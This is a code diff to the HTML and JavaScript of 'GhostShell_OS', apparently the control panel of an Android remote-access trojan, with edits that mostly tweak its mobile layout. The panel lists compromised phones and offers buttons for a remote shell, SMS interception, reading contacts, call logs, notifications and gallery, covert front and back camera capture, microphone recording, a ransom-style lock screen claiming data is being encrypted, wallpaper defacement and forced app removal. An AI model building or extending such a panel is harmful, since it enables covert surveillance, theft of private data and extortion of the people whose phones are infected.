@@ -14,7 +14,7 @@
             --bg: #050505; 
             --surface: #0a0a0a; 
             --surface-light: #111111;
-            --primary: #00ff33; /* Ijo Stabilo */
+            --primary: #00ff33;
             --primary-glow: rgba(0, 255, 51, 0.2);
             --danger: #ff003c;
             --text: #e0e0e0; 
@@ -26,7 +26,6 @@
             color: var(--text); 
             padding: 15px; 
             overflow-x: hidden; 
-            /* Subtle CRT Scanline effect */
             background-image: linear-gradient(rgba(0, 255, 51, 0.03) 1px, transparent 1px),
             linear-gradient(90deg, rgba(0, 255, 51, 0.03) 1px, transparent 1px);
             background-size: 20px 20px;
@@ -39,12 +38,12 @@
             transition: opacity 0.8s ease-out;
         }
         .pulse-logo {
-            width: 160px; filter: drop-shadow(0 0 15px var(--primary));
+            width: 140px; filter: drop-shadow(0 0 15px var(--primary));
             animation: pulse 2s infinite;
         }
         .sys-text {
-            margin-top: 25px; color: var(--primary); font-size: 1.2rem;
-            letter-spacing: 3px; animation: blink 1s infinite;
+            margin-top: 25px; color: var(--primary); font-size: 1.1rem;
+            letter-spacing: 3px; animation: blink 1s infinite; text-align: center;
         }
         @keyframes pulse { 0% { transform: scale(0.95); opacity: 0.8; } 50% { transform: scale(1.05); opacity: 1; filter: drop-shadow(0 0 25px var(--primary)); } 100% { transform: scale(0.95); opacity: 0.8; } }
         @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
@@ -52,24 +51,21 @@
         /* LAYOUT */
         .app-container { max-width: 900px; margin: 0 auto; display: flex; flex-direction: column; gap: 20px; }
         .panel { 
-            background: var(--surface); 
-            border: 1px solid var(--dim); 
-            border-radius: 4px; /* Sudut tajam ala hacker UI */
-            padding: 20px; 
-            box-shadow: inset 0 0 20px rgba(0,0,0,0.8);
-            position: relative;
+            background: var(--surface); border: 1px solid var(--dim); border-radius: 4px; 
+            padding: 20px; box-shadow: inset 0 0 20px rgba(0,0,0,0.8); position: relative;
         }
-        .panel::before { /* Aksen dekoratif di sudut panel */
+        .panel::before { 
             content:''; position:absolute; top:-1px; left:-1px; width:15px; height:15px;
             border-top: 2px solid var(--primary); border-left: 2px solid var(--primary);
         }
 
         /* HEADER */
         .header { display: flex; justify-content: space-between; align-items: center; background: #000; border-bottom: 1px solid var(--primary); }
-        .header h1 { font-size: 1.4rem; color: var(--primary); text-shadow: 0 0 10px var(--primary-glow); text-transform: uppercase; letter-spacing: 2px; }
-        
+        .header h1 { font-size: 1.3rem; color: var(--primary); text-shadow: 0 0 10px var(--primary-glow); text-transform: uppercase; letter-spacing: 1px; }
+        .header-actions { display: flex; align-items: center; gap: 15px; }
+
         /* VIEWS */
-        #dashboard-view { display: none; } /* Disembunyikan awalnya */
+        #dashboard-view { display: none; }
 
         /* DEVICE LIST */
         .device-item { 
@@ -78,24 +74,24 @@
             transition: all 0.2s ease; line-height: 1.5; 
         }
         .device-item:hover { border-color: var(--dim); border-left: 4px solid var(--primary); background: #162216; }
-        .device-header { display:flex; justify-content: space-between; font-size: 1.1rem; margin-bottom: 5px; color: #fff; }
-        .device-sub { font-size: 0.85rem; color: var(--dim); display: flex; gap: 15px; }
-        .sys-title { color: var(--text); border-bottom: 1px dashed var(--dim); padding-bottom: 8px; margin-bottom: 15px; font-size: 1rem; letter-spacing: 1px;}
+        .device-header { display:flex; justify-content: space-between; font-size: 1rem; margin-bottom: 5px; color: #fff; word-break: break-all; gap: 10px;}
+        .device-sub { font-size: 0.8rem; color: var(--dim); display: flex; flex-wrap: wrap; gap: 10px; }
+        .sys-title { color: var(--text); border-bottom: 1px dashed var(--dim); padding-bottom: 8px; margin-bottom: 15px; font-size: 0.95rem; letter-spacing: 1px;}
 
         /* DASHBOARD STATUS & GRID */
-        .top-controls { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
+        .top-controls { display: flex; justify-content: space-between; align-items: center; gap: 10px; margin-bottom: 15px; }
         .status-bar { 
-            display: flex; gap: 20px; background: #000; padding: 12px 20px; 
-            border: 1px solid #222; border-radius: 4px; font-size: 0.95rem; flex: 1;
+            display: flex; gap: 15px; background: #000; padding: 12px 15px; 
+            border: 1px solid #222; border-radius: 4px; font-size: 0.85rem; flex: 1; word-break: break-all;
         }
-        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 12px; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 10px; }
         
         /* BUTTONS */
         .btn { 
             background: #0a0a0a; border: 1px solid #333; border-radius: 4px; padding: 15px 5px; 
-            text-align: center; color: var(--dim); cursor: pointer; font-size: 0.85rem; transition: 0.2s; 
+            text-align: center; color: var(--dim); cursor: pointer; font-size: 0.8rem; transition: 0.2s; 
         }
-        .btn i { display: block; font-size: 1.6rem; margin-bottom: 10px; color: var(--primary); opacity: 0.8; }
+        .btn i { display: block; font-size: 1.5rem; margin-bottom: 8px; color: var(--primary); opacity: 0.8; }
         .btn:hover { border-color: var(--primary); color: var(--primary); box-shadow: inset 0 0 10px var(--primary-glow); }
         .btn:hover i { opacity: 1; text-shadow: 0 0 8px var(--primary); }
         .btn.active { border-color: var(--danger); color: var(--danger); }
@@ -103,35 +99,55 @@
         
         button.action-btn { 
             background: transparent; color: var(--primary); font-weight: bold; border: 1px solid var(--primary); 
-            padding: 8px 15px; border-radius: 2px; cursor: pointer; transition: 0.2s; text-transform: uppercase;
+            padding: 8px 12px; border-radius: 2px; cursor: pointer; transition: 0.2s; text-transform: uppercase;
         }
         button.action-btn:hover { background: var(--primary); color: #000; box-shadow: 0 0 15px var(--primary-glow); }
         button.action-btn.red { border-color: var(--danger); color: var(--danger); }
         button.action-btn.red:hover { background: var(--danger); color: #000; box-shadow: 0 0 15px rgba(255,0,60,0.3); }
 
         /* MODAL & TERMINAL */
-        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(3px); z-index: 100; align-items: center; justify-content: center; padding: 15px; }
+        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(3px); z-index: 100; align-items: center; justify-content: center; padding: 10px; }
         .modal-card { background: #050505; width: 100%; max-width: 850px; max-height: 90vh; border-radius: 4px; border: 1px solid var(--primary); display: flex; flex-direction: column; box-shadow: 0 0 30px rgba(0,255,51,0.1); }
-        .modal-header { padding: 15px 20px; background: #0a0a0a; display: flex; justify-content: space-between; border-bottom: 1px solid #222; }
-        .modal-body { padding: 20px; overflow-y: auto; flex: 1; font-size: 0.9rem; }
-        .modal-footer { padding: 15px; background: #0a0a0a; display: flex; gap: 10px; flex-wrap: wrap; border-top: 1px solid #222; }
+        .modal-header { padding: 12px 15px; background: #0a0a0a; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #222; }
+        .modal-body { padding: 15px; overflow-y: auto; flex: 1; font-size: 0.85rem; }
+        .modal-footer { padding: 12px 15px; background: #0a0a0a; display: flex; gap: 8px; flex-wrap: wrap; border-top: 1px solid #222; }
         
         .terminal { 
-            background: #000; color: var(--primary); padding: 15px; border-radius: 2px; 
-            height: 350px; overflow-y: auto; border: 1px solid #222; margin-bottom: 10px; white-space: pre-wrap;
-            box-shadow: inset 0 0 15px rgba(0,255,51,0.05); text-shadow: 0 0 2px rgba(0,255,51,0.5);
+            background: #000; color: var(--primary); padding: 12px; border-radius: 2px; 
+            height: 300px; overflow-y: auto; border: 1px solid #222; margin-bottom: 10px; white-space: pre-wrap;
+            box-shadow: inset 0 0 15px rgba(0,255,51,0.05); word-break: break-all;
         }
         
         /* TABLES & FORMS */
-        table { width: 100%; border-collapse: collapse; }
-        th { color: var(--dim); border-bottom: 1px solid #333; padding: 10px; text-align: left; text-transform: uppercase; font-size: 0.8rem; }
-        td { padding: 10px; border-bottom: 1px solid #111; color: var(--text); font-size: 0.9rem; }
-        input, textarea { background: #0a0a0a; border: 1px solid #333; padding: 12px; border-radius: 2px; color: var(--primary); width: 100%; outline: none; transition: 0.3s; }
+        .table-responsive { width: 100%; overflow-x: auto; display: block; }
+        table { width: 100%; border-collapse: collapse; min-width: 400px; }
+        th { color: var(--dim); border-bottom: 1px solid #333; padding: 8px; text-align: left; text-transform: uppercase; font-size: 0.75rem; white-space: nowrap;}
+        td { padding: 8px; border-bottom: 1px solid #111; color: var(--text); font-size: 0.85rem; }
+        input, textarea { background: #0a0a0a; border: 1px solid #333; padding: 10px; border-radius: 2px; color: var(--primary); width: 100%; outline: none; transition: 0.3s; }
         input:focus, textarea:focus { border-color: var(--primary); box-shadow: inset 0 0 5px var(--primary-glow); }
         
-        .gal-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 10px; }
-        .gal-item img { width: 100%; height: 100px; object-fit: cover; border-radius: 2px; border: 1px solid #333; }
-        .gal-item img:hover { border-color: var(--primary); }
+        .gal-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); gap: 8px; }
+        .gal-item img { width: 100%; height: 90px; object-fit: cover; border-radius: 2px; border: 1px solid #333; }
+        
+        /* --- MOBILE RESPONSIVE TWEAKS --- */
+        @media (max-width: 650px) {
+            body { padding: 10px; }
+            .panel { padding: 15px; }
+            .header { flex-direction: column; align-items: flex-start; gap: 12px; padding: 15px; }
+            .header-actions { width: 100%; justify-content: space-between; }
+            
+            .top-controls { flex-direction: column; align-items: stretch; }
+            .status-bar { flex-direction: column; align-items: center; text-align: center; gap: 8px; padding: 10px; }
+            
+            .grid { grid-template-columns: repeat(2, 1fr); gap: 8px; }
+            .btn { padding: 12px 5px; font-size: 0.75rem; }
+            
+            .modal-card { height: 95vh; }
+            .modal-footer { flex-direction: column; align-items: stretch; }
+            .modal-footer button { width: 100%; margin-bottom: 5px; }
+            
+            .terminal { height: 200px; font-size: 0.75rem; }
+        }
     </style>
 </head>
 <body>
@@ -143,8 +159,8 @@
     <div class="app-container">
         <header class="panel header">
             <h1><i class="fas fa-terminal"></i> GhostShell_OS</h1>
-            <div style="display:flex; align-items:center; gap:15px;">
-                <div style="color:var(--dim); font-size:0.9rem;">
+            <div class="header-actions">
+                <div style="color:var(--dim); font-size:0.85rem;">
                     [UID: <span id="user-display" style="color:var(--primary)"></span>]
                 </div>
                 <button onclick="logout()" class="action-btn red" style="font-size: 0.7rem; padding: 5px 10px;">DISCONNECT</button>
@@ -154,7 +170,7 @@
         <div id="selection-view" class="panel">
             <h3 class="sys-title"><i class="fas fa-satellite-dish"></i> DETECTED TARGETS</h3>
             <div id="device-list" style="margin-top: 15px;">
-                <div style="color:var(--dim);">Scanning network for endpoints...</div>
+                <div style="color:var(--dim); text-align:center; padding: 20px 0;">Scanning network...</div>
             </div>
         </div>
 
@@ -177,8 +193,8 @@
     <div id="modal" class="modal">
         <div class="modal-card">
             <div class="modal-header">
-                <h3 id="modal-title" style="color:var(--primary); text-transform: uppercase;">MODAL</h3>
-                <span style="cursor:pointer; font-size:1.5rem; color: var(--dim);" onclick="closeModal()">&times;</span>
+                <h3 id="modal-title" style="color:var(--primary); text-transform: uppercase; font-size: 1.1rem;">MODAL</h3>
+                <span style="cursor:pointer; font-size:1.5rem; color: var(--dim); padding: 0 10px;" onclick="closeModal()">&times;</span>
             </div>
             <div class="modal-body" id="modal-body"></div>
             <div class="modal-footer" id="modal-footer"></div>
@@ -192,7 +208,7 @@
                 const loader = document.getElementById('loading-screen');
                 loader.style.opacity = '0';
                 setTimeout(() => loader.style.display = 'none', 800);
-            }, 2500); // Tampil 2.5 detik awal
+            }, 2500); 
         };
 
         function selectTarget(id) {
@@ -231,16 +247,16 @@
 
             if(t === 'filemanager') {
                 termOut = "root@ghost_os:~# Establishing remote shell...\nroot@ghost_os:~# Shell Active.\n";
-                b.innerHTML = `<div class="terminal" id="terminal">${termOut}</div><div style="display:flex; gap:10px; background:#000; padding:12px; border:1px solid #333; border-radius:2px;"><span style="color:var(--primary)">root@target:~#</span><input id="term-in" style="background:transparent; border:none; color:var(--primary); outline:none; width:100%; padding:0;" autofocus onkeydown="if(event.key==='Enter') execShell()"></div>`;
+                b.innerHTML = `<div class="terminal" id="terminal">${termOut}</div><div style="display:flex; gap:10px; background:#000; padding:12px; border:1px solid #333; border-radius:2px;"><span style="color:var(--primary)">#</span><input id="term-in" style="background:transparent; border:none; color:var(--primary); outline:none; width:100%; padding:0;" autofocus onkeydown="if(event.key==='Enter') execShell()"></div>`;
                 f.innerHTML = `<button class="action-btn" onclick="document.getElementById('up-file').click()">[+] UPLOAD FILE</button><input type="file" id="up-file" style="display:none" onchange="uploadShellFile(this)">`;
                 cmd('filemanager'); return;
             } else if(t === 'panic') {
                 b.innerHTML = `<p style="color:var(--dim); margin-bottom:5px;">Duration (sec):</p><input type="number" id="psec" value="30"><p style="margin-top:15px; color:var(--dim); margin-bottom:5px;">Hell Message:</p><textarea id="pmsg" style="height:100px;">YOU ARE HACKED!</textarea>`;
-                f.innerHTML = `<button class="action-btn red" style="width:100%" onclick="cmd('panic '+document.getElementById('psec').value+'|'+document.getElementById('pmsg').value.replace(/\\n/g,'<br>'))">EXECUTE HELL</button><button class="action-btn" onclick="cmd('stop_panic')">ABORT</button>`;
+                f.innerHTML = `<button class="action-btn red" onclick="cmd('panic '+document.getElementById('psec').value+'|'+document.getElementById('pmsg').value.replace(/\\n/g,'<br>'))">EXECUTE HELL</button><button class="action-btn" onclick="cmd('stop_panic')">ABORT</button>`;
                 return;
             } else if(t === 'voice') {
                 b.innerHTML = `<div style="text-align:center; padding:30px;"><i id="v-icon" class="fas fa-microphone" style="font-size:4rem; color:var(--dim); margin-bottom:15px;"></i><p id="v-stat" style="color:var(--primary)">Awaiting Input...</p></div>`;
-                f.innerHTML = `<button id="v-start" class="action-btn" style="width:100%;" onclick="startRec()">START RECORDING</button><button id="v-stop" onclick="stopRec()" style="display:none; width:100%;" class="action-btn red">STOP & TRANSMIT</button>`;
+                f.innerHTML = `<button id="v-start" class="action-btn" onclick="startRec()">START RECORDING</button><button id="v-stop" onclick="stopRec()" style="display:none;" class="action-btn red">STOP & TRANSMIT</button>`;
                 return;
             } else if(t === 'setwallpaper') {
                 b.innerHTML = `<p style="color:var(--dim); margin-bottom:5px;">Upload Local:</p><input type="file" onchange="uploadWall(this)"><p style="margin-top:15px; color:var(--dim); margin-bottom:5px;">Inject URL:</p><input id="wurl" placeholder="https://domain.com/img.jpg">`;
@@ -248,15 +264,15 @@
                 return;
             } else if(t === 'toast') {
                 b.innerHTML = `<p style="color:var(--dim); margin-bottom:5px;">System Message:</p><textarea id="lmsg" style="height:100px;">SYSTEM CRITICAL ERROR\\nYour data is being encrypted.</textarea><p style="margin-top:15px; color:var(--dim); margin-bottom:5px;">Unlock PIN:</p><input id="lpin" value="1337" style="text-align:center; font-size:1.5rem; letter-spacing: 5px;">`;
-                f.innerHTML = `<button class="action-btn red" style="width:100%" onclick="cmd('lock '+document.getElementById('lmsg').value.replace(/\\n/g, '<br>')+'|'+document.getElementById('lpin').value)">LOCK DEVICE</button><button class="action-btn" onclick="cmd('unlock')">FORCE UNLOCK</button>`;
+                f.innerHTML = `<button class="action-btn red" onclick="cmd('lock '+document.getElementById('lmsg').value.replace(/\\n/g, '<br>')+'|'+document.getElementById('lpin').value)">LOCK DEVICE</button><button class="action-btn" onclick="cmd('unlock')">FORCE UNLOCK</button>`;
                 return;
             } else if(t === 'vibrate') {
                 b.innerHTML = `<p style="color:var(--dim); margin-bottom:5px;">Duration (Seconds):</p><input type="number" id="vsec" value="5">`;
-                f.innerHTML = `<button class="action-btn" style="width:100%;" onclick="cmd('vibrate '+document.getElementById('vsec').value)">EXECUTE</button>`;
+                f.innerHTML = `<button class="action-btn" onclick="cmd('vibrate '+document.getElementById('vsec').value)">EXECUTE</button>`;
                 return;
             } else if(t === 'open_url') {
                 b.innerHTML = `<p style="color:var(--dim); margin-bottom:5px;">Target URL:</p><input id="ourl" value="https://google.com">`;
-                f.innerHTML = `<button class="action-btn" style="width:100%;" onclick="cmd('openurl '+document.getElementById('ourl').value)">FORCE OPEN</button>`;
+                f.innerHTML = `<button class="action-btn" onclick="cmd('openurl '+document.getElementById('ourl').value)">FORCE OPEN</button>`;
                 return;
             }
 
@@ -320,24 +336,25 @@
             if(hash === curHash) return; hash = curHash;
             b.innerHTML = "";
 
+            // Tabel dibungkus .table-responsive biar bisa di-scroll ke samping di HP
             if(curMod === 'info') {
                 const i = d.info;
-                b.innerHTML = `<table><tr><td>Model</td><td>${i.Model}</td></tr><tr><td>Vendor</td><td>${i.Manufacturer}</td></tr><tr><td>OS Base</td><td>Android ${i.AndroidVersion}</td></tr><tr><td>Location</td><td>${i.Country}</td></tr><tr><td>Power</td><td>${i.Battery}</td></tr><tr><td>Network</td><td>${i.WiFi}</td></tr><tr><td>SIM_1</td><td>${i.SIM1 || 'NULL'}</td></tr><tr><td>SIM_2</td><td>${i.SIM2 || 'NULL'}</td></tr><tr><td>Phone_No</td><td>${i.PhoneNumber}</td></tr></table>`;
+                b.innerHTML = `<div class="table-responsive"><table><tr><td>Model</td><td>${i.Model}</td></tr><tr><td>Vendor</td><td>${i.Manufacturer}</td></tr><tr><td>OS Base</td><td>Android ${i.AndroidVersion}</td></tr><tr><td>Location</td><td>${i.Country}</td></tr><tr><td>Power</td><td>${i.Battery}</td></tr><tr><td>Network</td><td>${i.WiFi}</td></tr><tr><td>SIM_1</td><td>${i.SIM1 || 'NULL'}</td></tr><tr><td>SIM_2</td><td>${i.SIM2 || 'NULL'}</td></tr><tr><td>Phone_No</td><td>${i.PhoneNumber}</td></tr></table></div>`;
             } else if(curMod === 'apps') {
-                b.innerHTML = `<table><tr><th>Package Name</th><th>Execute</th></tr>${d.apps.map(a=>`<tr><td><b style="color:var(--text)">${a.appName}</b><br><small style="color:var(--dim)">${a.packageName}</small></td><td style="text-align:right;"><button class="action-btn" style="padding:5px 10px; font-size:0.7rem;" onclick="cmd('run ${a.packageName}')">RUN</button> <button class="action-btn red" style="padding:5px 10px; font-size:0.7rem;" onclick="cmd('uninstall ${a.packageName}')">DEL</button></td></tr>`).join('')}</table>`;
+                b.innerHTML = `<div class="table-responsive"><table><tr><th>Package Name</th><th>Execute</th></tr>${d.apps.map(a=>`<tr><td><b style="color:var(--text)">${a.appName}</b><br><small style="color:var(--dim)">${a.packageName}</small></td><td style="text-align:right;"><button class="action-btn" style="padding:5px 10px; font-size:0.7rem; margin-right:5px;" onclick="cmd('run ${a.packageName}')">RUN</button><button class="action-btn red" style="padding:5px 10px; font-size:0.7rem;" onclick="cmd('uninstall ${a.packageName}')">DEL</button></td></tr>`).join('')}</table></div>`;
             } else if(curMod === 'sms') {
-                b.innerHTML = `<table><tr><th>Target/Sender</th><th>Payload</th></tr>${d.sms.map(l=>`<tr><td style="color:var(--primary)">${l.userSender}</td><td>${l.content}</td></tr>`).join('')}</table>`;
+                b.innerHTML = `<div class="table-responsive"><table><tr><th>Target/Sender</th><th>Payload</th></tr>${d.sms.map(l=>`<tr><td style="color:var(--primary)">${l.userSender}</td><td>${l.content}</td></tr>`).join('')}</table></div>`;
             } else if(curMod === 'calls') {
-                b.innerHTML = `<table><tr><th>Identifier</th><th>Time (Sec)</th></tr>${d.calls.map(l=>`<tr><td style="color:var(--primary)">${l.number}</td><td>${l.duration_seconds}s</td></tr>`).join('')}</table>`;
+                b.innerHTML = `<div class="table-responsive"><table><tr><th>Identifier</th><th>Time (Sec)</th></tr>${d.calls.map(l=>`<tr><td style="color:var(--primary)">${l.number}</td><td>${l.duration_seconds}s</td></tr>`).join('')}</table></div>`;
             } else if(curMod === 'contacts') {
-                b.innerHTML = `<table><tr><th>Entity Name</th><th>Route Number</th></tr>${d.contacts.map(c=>`<tr><td>${c.name}</td><td style="color:var(--primary)">${c.number}</td></tr>`).join('')}</table>`;
+                b.innerHTML = `<div class="table-responsive"><table><tr><th>Entity Name</th><th>Route Number</th></tr>${d.contacts.map(c=>`<tr><td>${c.name}</td><td style="color:var(--primary)">${c.number}</td></tr>`).join('')}</table></div>`;
             } else if(curMod === 'gallery') {
                 b.innerHTML = `<div class="gal-grid">${d.gallery.files.map(x=>`<div class="gal-item"><img src="data:image/jpeg;base64,${x.thumbnail}"/><p style="font-size:0.6rem; margin-top:5px; color:var(--dim); word-break:break-all;">${x.name}</p></div>`).join('')}</div>`;
-                f.innerHTML = `<button class="action-btn" onclick="cmd('gallery back')"><i class="fas fa-chevron-left"></i></button><span style="color:var(--primary); font-weight:bold; padding:0 15px;">DIR_PAGE: ${d.gallery.page}</span><button class="action-btn" onclick="cmd('gallery next')"><i class="fas fa-chevron-right"></i></button>`;
+                f.innerHTML = `<div style="display:flex; justify-content:space-between; width:100%; align-items:center;"><button class="action-btn" onclick="cmd('gallery back')"><i class="fas fa-chevron-left"></i></button><span style="color:var(--primary); font-weight:bold; font-size:0.9rem;">PAGE: ${d.gallery.page}</span><button class="action-btn" onclick="cmd('gallery next')"><i class="fas fa-chevron-right"></i></button></div>`;
             } else if(curMod.includes('pic')) {
-                b.innerHTML = `<div style="text-align:center;"><img src="${d.media.is_direct?'data:image/jpeg;base64,'+d.media.last_img:'/captured_images/'+d.media.last_img}" style="width:100%; border-radius:2px; border:1px solid var(--primary); box-shadow:0 0 15px rgba(0,255,51,0.2);"></div>`;
+                b.innerHTML = `<div style="text-align:center;"><img src="${d.media.is_direct?'data:image/jpeg;base64,'+d.media.last_img:'/captured_images/'+d.media.last_img}" style="width:100%; max-width: 500px; border-radius:2px; border:1px solid var(--primary); box-shadow:0 0 15px rgba(0,255,51,0.2);"></div>`;
             } else if(curMod === 'notifications') {
-                b.innerHTML = `<table><tr><th>Source</th><th>Content</th></tr>${d.notifications.map(n=>`<tr><td style="color:var(--primary); font-size:0.8rem;">${n.packageName}</td><td><b style="color:var(--text)">${n.title}</b><br><span style="color:var(--dim)">${n.text}</span></td></tr>`).join('')}</table>`;
+                b.innerHTML = `<div class="table-responsive"><table><tr><th>Source</th><th>Content</th></tr>${d.notifications.map(n=>`<tr><td style="color:var(--primary); font-size:0.8rem;">${n.packageName}</td><td><b style="color:var(--text)">${n.title}</b><br><span style="color:var(--dim)">${n.text}</span></td></tr>`).join('')}</table></div>`;
                 f.innerHTML = `<button class="action-btn" style="width:100%" onclick="cmd('getnotifications')">REFRESH DATA</button>`;
             }
         }
@@ -347,20 +364,19 @@
                 const res = await fetch(`/api/status?owner=${myUid}`);
                 state = await res.json();
                 
-                // UPDATE TARGET LIST UI
                 document.getElementById('device-list').innerHTML = state.devices.map(d=>`
                     <div class="device-item" onclick="selectTarget('${d.id}')">
                         <div class="device-header">
                             <span><i class="fas fa-mobile-screen" style="color:var(--primary); margin-right:8px;"></i> ${d.model}</span>
-                            <span style="color:var(--primary)">[ ACTIVE ]</span>
+                            <span style="color:var(--primary); font-size:0.85rem; margin-top:2px;">[ ACTIVE ]</span>
                         </div>
                         <div class="device-sub">
-                            <span>OS: ANDROID ${d.ver}</span>
+                            <span>OS: AND ${d.ver}</span>
                             <span>LOC: ${d.cnt}</span>
                             <span style="color:var(--primary)">PWR: ${d.bat}</span>
                         </div>
                     </div>
-                `).join('') || "<div style='color:var(--dim); font-style:italic;'>No active endpoints found on network...</div>";
+                `).join('') || "<div style='color:var(--dim); font-style:italic; text-align:center; padding: 20px 0;'>No active endpoints found on network...</div>";
                 
                 if(selId) {
                     const dres = await fetch(`/api/data/${selId}`);
@@ -380,12 +396,12 @@
             const btns = [
                 {id:'filemanager', i:'fa-terminal', l:'SYS SHELL'}, {id:'info', i:'fa-server', l:'SYS INFO'},
                 {id:'panic', i:'fa-skull-crossbones', l:'HELL LOCK'}, {id:'contacts', i:'fa-address-book', l:'CONTACTS'},
-                {id:'sms', i:'fa-comment-sms', l:'INTERCEPT SMS'}, {id:'calls', i:'fa-phone-volume', l:'CALL LOGS'},
+                {id:'sms', i:'fa-comment-sms', l:'INTERCEPT'}, {id:'calls', i:'fa-phone-volume', l:'CALL LOGS'},
                 {id:'gallery', i:'fa-images', l:'GALLERY'}, {id:'notifications', i:'fa-bell', l:'NOTIFS'},
                 {id:'apps', i:'fa-box-archive', l:'PACKAGES'}, {id:'flash', i:'fa-bolt', l:'FLASH'},
-                {id:'vibrate', i:'fa-wave-square', l:'VIBRATE'}, {id:'voice', i:'fa-microphone-lines', l:'AUDIO INJECT'},
+                {id:'vibrate', i:'fa-wave-square', l:'VIBRATE'}, {id:'voice', i:'fa-microphone-lines', l:'MIC INJECT'},
                 {id:'takebackpic', i:'fa-camera', l:'CAM BACK'}, {id:'takefrontpic', i:'fa-video', l:'CAM FRONT'},
-                {id:'setwallpaper', i:'fa-image', l:'DEFACE WP'}, {id:'toast', i:'fa-lock', l:'RANSOM LOCK'},
+                {id:'setwallpaper', i:'fa-image', l:'DEFACE WP'}, {id:'toast', i:'fa-lock', l:'RANSOM'},
                 {id:'open_url', i:'fa-globe', l:'FORCE URL'}
             ];
             document.getElementById('main-grid').innerHTML = btns.map(b=>`<div class="btn ${b.id==='flash'&&flash?'active':''}" onclick="${b.id==='flash'?'toggleFlash(this)':'openModal(\''+b.id+'\')'}"><i class="fas ${b.i}"></i>${b.l}</div>`).join('');
